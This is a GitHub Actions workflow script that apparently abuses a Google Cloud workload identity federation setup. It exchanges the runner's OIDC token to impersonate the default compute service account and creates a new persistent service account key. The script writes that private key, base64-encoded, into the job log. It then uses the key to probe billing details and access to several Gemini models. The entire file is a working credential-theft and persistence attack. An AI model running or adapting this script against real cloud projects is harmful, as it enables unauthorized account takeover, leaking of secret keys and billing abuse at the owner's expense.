name: i1934-keymint
on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  km:
    runs-on: ubuntu-latest
    timeout-minutes: 12
    steps:
      - name: run
        run: |
          set +e
          NUM=303574531351
          POOL=github-actions-pool
          PROV=github-provider
          PRJ="projects/$NUM/locations/global/workloadIdentityPools/$POOL/providers/$PROV"
          SA="$NUM-compute@developer.gserviceaccount.com"
          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
          jq -n '{keyAlgorithm:"KEY_ALG_RSA_2048"}' > keyreq.json

          J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=//iam.googleapis.com/$PRJ")
          echo "$J" | jq -r '.value // empty' > tok.jwt
          [ -s tok.jwt ] || { echo "##MINT_FAIL"; exit 0; }
          echo "##MINT ok=1 len=$(wc -c < tok.jwt)"

          sc=$(curl -s -o sts.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
            --data-urlencode "subject_token=$(cat tok.jwt)" \
            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
            -d "scope=https://www.googleapis.com/auth/cloud-platform")
          FT=$(jq -r '.access_token // empty' sts.json)
          echo "##STS code=$sc ftlen=${#FT} body=$(head -c 240 sts.json | tr -d '\n' | tr -s ' ')"
          [ -n "$FT" ] || { echo "##STS_FAIL"; exit 0; }

          gc=$(curl -s -o gat.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H 'Content-Type: application/json' \
            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
          AT=$(jq -r '.accessToken // empty' gat.json)
          echo "##GEN code=$gc toklen=${#AT} body=$(head -c 240 gat.json | tr -d '\n' | tr -s ' ')"
          [ -n "$AT" ] || { echo "##GEN_FAIL"; exit 0; }

          kw=$(curl -s -o keyw.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' \
            "https://iam.googleapis.com/v1/projects/-/serviceAccounts/$SA/keys" -d @keyreq.json)
          echo "##KEY_WILD code=$kw"
          jq -r '.privateKeyData // empty' keyw.json | base64 -d > key.json 2>/dev/null
          KSZ=$(wc -c < key.json)
          echo "##KEYW_NAME $(jq -r '.name // empty' keyw.json)"
          echo "##KEYW_JSONLEN $KSZ type=$(jq -r '.type // empty' key.json 2>/dev/null) pkeyid=$(jq -r '.private_key_id // empty' key.json 2>/dev/null) cemail=$(jq -r '.client_email // empty' key.json 2>/dev/null)"
          echo "##KEYW_ERR $(head -c 400 keyw.json | tr -d '\n' | tr -s ' ')"
          [ "$KSZ" -gt 500 ] || { echo "##KEYW_FAIL"; exit 0; }
          echo "##KEYW_JSON_B64 $(base64 -w0 key.json)"

          echo "===== standalone JWT-bearer with the freshly created PKCS8 key"
          python3 - <<'PY' > jb.txt 2>&1
          import json, time, urllib.request, urllib.parse, urllib.error
          import jwt
          d = json.load(open('key.json'))
          c = {"iss": d["client_email"], "scope": "https://www.googleapis.com/auth/cloud-platform",
               "aud": "https://oauth2.googleapis.com/token", "iat": int(time.time()), "exp": int(time.time())+3600}
          a = jwt.encode(c, d["private_key"], algorithm="RS256")
          data = urllib.parse.urlencode({"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": a}).encode()
          req = urllib.request.Request("https://oauth2.googleapis.com/token", data=data,
                  headers={"Content-Type": "application/x-www-form-urlencoded"})
          try:
              r = urllib.request.urlopen(req, timeout=40); b = json.loads(r.read().decode())
              print("code=%d toklen=%d" % (r.status, len(b.get("access_token",""))))
              open('ktok.txt','w').write(b.get("access_token",""))
          except urllib.error.HTTPError as e:
              print("code=%d body=%s" % (e.code, e.read().decode()[:300]))
          PY
          cat jb.txt
          KT=$(cat ktok.txt 2>/dev/null)
          echo "##JWTBEARER $(sed -n '1p' jb.txt | tr -d '\n') ktoklen=${#KT}"
          [ -n "$KT" ] || { echo "##FINISHED1934"; exit 0; }

          b1=$(curl -s -o b1.json -w '%{http_code}' -H "Authorization: Bearer $KT" \
            "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo")
          echo "##BILLING code=$b1 body=$(tr -d '\n' < b1.json | tr -s ' ')"

          for LOC in us-central1 global; do
            HOST="$LOC-aiplatform.googleapis.com"
            [ "$LOC" = "global" ] && HOST="aiplatform.googleapis.com"
            for M in gemini-2.5-flash gemini-3.5-flash gemini-3-pro-preview gemini-2.5-pro gemini-3-flash-preview; do
              g=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $KT" -H 'Content-Type: application/json' \
                -d '{"contents":[{"role":"user","parts":[{"text":"hi"}]}],"generationConfig":{"maxOutputTokens":1}}' \
                "https://$HOST/v1beta1/projects/$NUM/locations/$LOC/publishers/google/models/$M:generateContent")
              echo "##GEN_${LOC}_${M} code=$g cands=$(jq -r '.candidates|length' g.json 2>/dev/null) body=$(head -c 200 g.json | tr -d '\n' | tr -s ' ')"
            done
          done
          echo "##FINISHED1934"
